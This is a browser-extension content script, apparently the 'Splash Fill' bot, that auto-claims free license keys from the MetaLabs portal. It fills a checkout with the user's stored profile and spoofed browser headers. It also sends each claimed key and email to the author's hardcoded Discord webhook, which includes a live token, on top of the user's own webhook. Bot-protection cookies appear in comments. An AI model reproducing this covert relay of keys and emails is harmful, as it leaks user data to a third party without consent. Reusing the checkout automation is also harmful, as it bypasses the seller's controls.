
window.onload = function () {
  function sleep (seconds) {
    var start = new Date().getTime();
    while (new Date() < start + seconds*1000) {}
    return 0;
}
chrome.storage.local.get({'profile' : {}, 'loginStatus' : '' , 'setting' : {}, 'modes' : {}}, (results) => {
 // console.log(results)
  this.loginStatus = results.loginStatus
  this.profiles = results.profile.profile
  this.settings = results.setting.settings
  this.modes = results.modes.modes
  console.log(this.loginStatus, this.profiles, this.settings, this.modes)

let webhook = this.settings.webhook
// console.log(webhook)
  if(this.loginStatus){

              
           //    console.log(this.modes)
            if(this.modes.metaLabsFree == true || this.modes.metaLabsFree == 'true'){
              let link = document.location.href
              let password = link.split('password=')[1]
          //    console.log(link)
          //    // console.log(password)
              let item = this.profiles


              let itemUser = this.profiles.firstName
              let itemPass = this.profiles.lastName
              let itemEmail = this.profiles.email
              class metaLabsFree {
                  constructor(item) {
                        this.item = item;
                        this.storeID = '';
                        this.successID = '';
                  }
                async start () {
                     await this.fetchSite()
                    await this.claimItem()
                    this.checkSite()
                  }
                async fetchSite (){
                 
                let myHeaders = new Headers();
                myHeaders.append("Accept", "application/json, text/plain, */*");
                myHeaders.append("DNT", "1");
                myHeaders.append("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36");
               // myHeaders.append("Cookie", "__cfduid=da08cc14365e38136e97d1e327105e0d01611079960; datadome=Tie1r6A0L~lVylrjr6j5j4V040TEflQISVydZDgRJLBfxE6VJYM~EsrE_wkEiMHpdNCv-h2fm-d_X29Y.DZRiZSysAD3uDkdup0NHWs-7K");
                var requestOptions = {
                method: 'GET',
                headers: myHeaders,
                redirect: 'follow'
                };

                let fetchSite = await fetch(`https://portal-api.metalabs.io/v1/release?password=${password}`, requestOptions)
                .then(response => response.text())
                .then(result => {
                    // console.log(result)
                    let parsedResult = JSON.parse(result)
                    this.storeID = parsedResult.id
                    // console.log(this.storeID)

                })
                .catch(error => console.log('error', error));


                }
                async claimItem () {


                    var myHeaders = new Headers();
                    myHeaders.append("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36");
                    myHeaders.append("DNT", "1");
                    myHeaders.append("content-type", "application/json; charset=utf-8");
                    myHeaders.append("Accept", "*/*");
               //     myHeaders.append("Cookie", "__cfduid=d6ee4eecf37168965ca708f5c03d504cf1611080032; datadome=XEFLxuNXcAYFdQweZfVFyoeSuXavJ83CWS64eH-JgyhhTPALVW3MvHsdW9XlZP39J5~6u_y_no7n5ZGEmu3uT5__24P90zJdb5~SDQeYrX");
                    
                    var raw = `{"release":"${this.storeID}","name":"${itemUser} ${itemPass}","email":"${itemEmail}","payment_method":null,"secret":"youneedtogetajob"}`;
                    
                    var requestOptions = {
                      method: 'POST',
                      headers: myHeaders,
                      body: raw,
                      redirect: 'follow'
                    };
                    
                    await fetch("https://portal-api.metalabs.io/v1/checkouts", requestOptions)
                      .then(response => response.text())
                      .then(result => { console.log(result)
                        let parsedResult = JSON.parse(result)
                        this.successID = parsedResult.id
                    })
                      .catch(error => console.log('error', error));
                }
                async checkSite () {
                    var myHeaders = new Headers();
                    myHeaders.append("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36");
                    myHeaders.append("DNT", "1");
                    myHeaders.append("Accept", "*/*");
                //    myHeaders.append("Cookie", "__cfduid=d6ee4eecf37168965ca708f5c03d504cf1611080032; datadome=XEFLxuNXcAYFdQweZfVFyoeSuXavJ83CWS64eH-JgyhhTPALVW3MvHsdW9XlZP39J5~6u_y_no7n5ZGEmu3uT5__24P90zJdb5~SDQeYrX");
                    var requestOptions = {
                      method: 'GET',
                      headers: myHeaders,
                      redirect: 'follow'
                    };
                    await sleep(5)
                     let fetchSite =  await fetch(`https://portal-api.metalabs.io/v1/checkouts/${this.successID}`, requestOptions)
                      .then((response) => {
                     response.text().then( async (result) => {
                      // console.log(result)
                      let parsedResult = JSON.parse(result)
                      // console.log(parsedResult)
                      let itemKey = parsedResult.license.key
                      let itemEmail = parsedResult.license.email
                      // console.log(itemEmail, itemKey)
                    //  let itemPrice = parsedResult.plan.amount
                   //   let keyType = parsedResult.plan.name
                   // console.log(`https://dashboard.splashfill.com/purchase/success?license=${itemKey}`)
                    fetch('https://discordapp.com/api/webhooks/801223334703661068/TuQyXOOa0McqUFH2FohthDH7nSKfol_lQtt460DNXh5qqfwrkGYEM7N2aexGWN9NDtEY', {
                      'method' : 'POST',
                      'headers' : {
                        'content-type': 'application/json'
                      },
                      'body' : JSON.stringify({
                        "embeds" : [{
                        'username': 'Splash Fill',
                            'avatar_url': 'https://cdn.discordapp.com/attachments/785309333784363068/792602210755805214/image0.png',
                            'color': `52479`,
                            'title': 'Successful Checkout',
                            'url': `https://dashboard.splashfill.com/purchase/success?license=${itemKey}`,
                       //     "content" : `Testing`,
                            'fields': [
                            {
                                'name': "__Key__",
                                'value': `||${itemKey}||`,
                                'inline': true
                            }, 
                            {
                                'name': "__Email__",
                                'value': `||${itemEmail}||`,
                                'inline': true
                            }],
                            'footer': {
                                'text': 'Splash Fill',
                                'icon_url': 'https://cdn.discordapp.com/attachments/785309333784363068/792602210755805214/image0.png'
                            }
                        }]
                    })
                      })
                    fetch(`${webhook}`, {
                        'method' : 'POST',
                        'headers' : {
                          'content-type': 'application/json'
                        },
                        'body' : JSON.stringify({
                          "embeds" : [{
                          'username': 'Splash Fill',
                              'avatar_url': 'https://cdn.discordapp.com/attachments/785309333784363068/792602210755805214/image0.png',
                              'color': `52479`,
                              'title': 'Successful Checkout',
                              'url': `https://dashboard.splashfill.com/purchase/success?license=${itemKey}`,
                         //     "content" : `Testing`,
                              'fields': [
                              {
                                  'name': "__Key__",
                                  'value': `||${itemKey}||`,
                                  'inline': true
                              }, 
                              {
                                  'name': "__Email__",
                                  'value': `||${itemEmail}||`,
                                  'inline': true
                              }],
                              'footer': {
                                  'text': 'Splash Fill',
                                  'icon_url': 'https://cdn.discordapp.com/attachments/785309333784363068/792602210755805214/image0.png'
                              }
                          }]
                      })
                        })
                   
                   
                      
                    })
                      })
                      
                      .catch(error =>  console.log('error', error));
                }
                 



              }
              const metaFree = new metaLabsFree(item);

              (async () => {
                  await metaFree.start()
              })()
            }
          
        
    


}
})
}